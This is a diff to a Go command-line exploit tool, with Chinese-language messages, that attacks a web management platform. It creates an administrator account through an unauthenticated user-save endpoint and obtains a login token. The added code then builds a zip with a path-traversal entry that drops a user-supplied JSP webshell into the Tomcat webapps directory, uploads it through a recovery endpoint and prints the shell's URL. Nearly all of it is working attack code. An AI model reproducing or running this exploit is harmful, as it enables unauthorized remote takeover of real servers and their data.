@@ -7,7 +7,10 @@
 package main
 
 import (
+	"archive/zip"
 	"bufio"
+	"bytes"
+	"crypto/md5"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
@@ -15,9 +18,11 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	mrand "math/rand"
 	neturl "net/url"
 	"os"
+	"path/filepath"
 	"regexp"
 	"strconv"
 	"strings"
@@ -49,6 +54,7 @@ var (
 	baseURL  string // WebRoot Path
 	timeout  int    // Timeout
 	token    string // Token
+	file     string // FileName
 )
 
 func showBanner() {
@@ -67,10 +73,10 @@ func hasStdin() bool {
 
 func init() {
 	flag.BoolVar(&h, "h", false, "显示帮助信息")
-	flag.StringVar(&url, "u", "", "目标URL，例如: https://example.com")
-	flag.StringVar(&proxyURL, "p", "", "使用代理，例如: http://127.0.0.1:8080")
-	// flag.StringVar(&command, "c", "", "期望被执行的命令")
-	flag.IntVar(&timeout, "t", 15, "请求超时时间")
+	flag.StringVar(&url, "u", "", "目标URL，例如: -u https://example.com")
+	flag.StringVar(&proxyURL, "p", "", "使用代理，例如: -p http://127.0.0.1:8080")
+	flag.StringVar(&file, "f", "", "期望上传的文件，例如：-f shell.jsp")
+	flag.IntVar(&timeout, "t", 15, "请求超时时间，例如：-t 20")
 	flag.Parse()
 
 	stdin = hasStdin()
@@ -101,25 +107,30 @@ func init() {
 		}
 	}
 
-	// check url url format.
+	// check url format.
 	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
-		gologger.Error().Msg("请检查输入的目标URL格式！\n\n")
+		gologger.Error().Msg("请检查输入的目标URL格式，请以http开头！\n\n")
 		os.Exit(0)
 	}
 
-	// no command
-	// if command == "" {
-	// 	gologger.Error().Msg("请输入要执行的命令！\n\n")
-	// 	os.Exit(0)
-	// }
+	// 判断文件是否存在
+	if file != "" {
+		// 使用 os.Stat() 函数获取文件信息
+		_, err := os.Stat(file)
+
+		if os.IsNotExist(err) {
+			gologger.Error().Msg("提供的文件不存在！\n\n")
+			os.Exit(0)
+		}
+	}
 }
 
 func main() {
 	gologger.Print().Label("INFO").Msg("Target: " + url)
-	saveuser(url, proxyURL)
+	exploit(url, proxyURL, file)
 }
 
-func saveuser(url string, proxyURL string) bool {
+func exploit(url string, proxyURL string, fileName string) bool {
 	client := resty.New()
 	client.SetTimeout(time.Duration(timeout) * time.Second)
 
@@ -147,7 +158,7 @@ func saveuser(url string, proxyURL string) bool {
 	if len(matches) > 1 {
 		gologger.Print().Label("INFO").Msg("JSESSIONID: " + matches[1])
 	} else {
-		gologger.Print().Label("ERR").Msg("JSESSIONID未找到，目标站点不存在漏洞")
+		gologger.Print().Label("ERR").Msg(" JSESSIONID未找到，目标站点不存在漏洞")
 		return false
 	}
 	jsessionID := matches[1]
@@ -170,7 +181,7 @@ func saveuser(url string, proxyURL string) bool {
 		Post(baseURL + "/admin/user_save.action")
 
 	if uResp.StatusCode() != 200 || uResp.String() != "" {
-		gologger.Print().Label("ERR").Msg("创建用户失败")
+		gologger.Print().Label("ERR").Msg(" 创建用户失败")
 		return false
 	}
 
@@ -183,13 +194,13 @@ func saveuser(url string, proxyURL string) bool {
 		Post(baseURL + "/WPMS/getPublicKey")
 
 	if !strings.Contains(string(pResp.Body()), `success":"true`) {
-		gologger.Print().Label("ERR").Msg("PublicKey获取失败")
+		gologger.Print().Label("ERR").Msg(" PublicKey获取失败")
 		return false
 	}
 
 	var pData map[string]interface{}
 	if err := json.Unmarshal([]byte(pResp.String()), &pData); err != nil {
-		gologger.Print().Label("ERR").Msg("Error parsing JSON")
+		gologger.Print().Label("ERR").Msg(" Error parsing JSON")
 		return false
 	}
 
@@ -213,26 +224,75 @@ func saveuser(url string, proxyURL string) bool {
 
 	var lData map[string]interface{}
 	if err := json.Unmarshal([]byte(lResp.String()), &lData); err != nil {
-		gologger.Print().Label("ERR").Msg("Error parsing JSON")
+		gologger.Print().Label("ERR").Msg(" Error parsing JSON")
 		return false
 	}
 	token, _ = lData["token"].(string)
-	gologger.Print().Label("INFO").Msg("Token: " + token)
+	// gologger.Print().Label("INFO").Msg("Token: " + token)
+
+	if fileName == "" {
+		return true
+	}
+
+	// 4. Request login_login.action
+	loginResp, _ := client.R().
+		SetHeader("User-Agent", userAgent).
+		Get(baseURL + "/admin/login_login.action?subSystemToken=" + token)
+
+	if loginResp.StatusCode() != 200 && strings.Contains(string(loginResp.Body()), "username_content\">"+username) {
+		gologger.Print().Label("ERR").Msg(" login_login.action请求失败")
+		return false
+	}
+
+	// 5. Generate Evil Zip File
+	filename, zipContent := genEvilZip(file)
+
+	// 6. Upload Zip
+	gologger.Print().Label("INFO").Msg("上传恶意ZIP文件中……")
+	rResp, _ := client.R().
+		SetHeader("User-Agent", userAgent).
+		SetFileReader("recoverFile", genRandStr(6)+".zip", bytes.NewReader(zipContent)).
+		SetHeader("Accept-Encoding", "gzip, deflate").
+		SetHeader("Content-Type", "application/zip").
+		Post(baseURL + "/admin/recover_recover.action?password=" + fmt.Sprintf("%x", md5.Sum([]byte(username+":dss:"+password))))
+
+	if rResp.StatusCode() != 200 || rResp.String() != "" {
+		gologger.Print().Label("ERR").Msg(" 上传恶意ZIP文件失败")
+		return false
+	}
+
+	// 7. Request Webshell
+	webShellPath := "/upload/" + filename
+	shellResp, _ := client.R().
+		SetHeader("User-Agent", userAgent).
+		Get(baseURL + webShellPath)
+	if shellResp.StatusCode() == 404 {
+		gologger.Print().Label("ERR").Msg(" Webshell上传失败")
+		return false
+	}
+
+	gologger.Print().Label("INFO").Msg("Webshell: " + baseURL + webShellPath)
 
 	return true
-
 }
 
-// func extractJSessionID(cookies string) string {
-// 	cookieParts := strings.Split(cookies, ";")
-// 	for _, cookiePart := range cookieParts {
-// 		cookiePart = strings.TrimSpace(cookiePart)
-// 		if strings.HasPrefix(cookiePart, "JSESSIONID=") {
-// 			return strings.TrimPrefix(cookiePart, "JSESSIONID=")
-// 		}
-// 	}
-// 	return ""
-// }
+func genEvilZip(file string) (string, []byte) {
+	filename := genRandStr(12) + ".jsp"
+
+	buf := new(bytes.Buffer)
+	writer := zip.NewWriter(buf)
+	defer writer.Close()
+	evilpath := "../../../../../../../../../../../../../opt/tomcat/webapps/upload/" + filename
+	f, _ := writer.Create(evilpath)
+
+	var content []byte
+	content, _ = ioutil.ReadFile(filepath.Clean(file))
+
+	f.Write(content)
+	_ = writer.Close()
+
+	return filename, buf.Bytes()
+}
 
 func genRandStr(length int) string {
 	const (
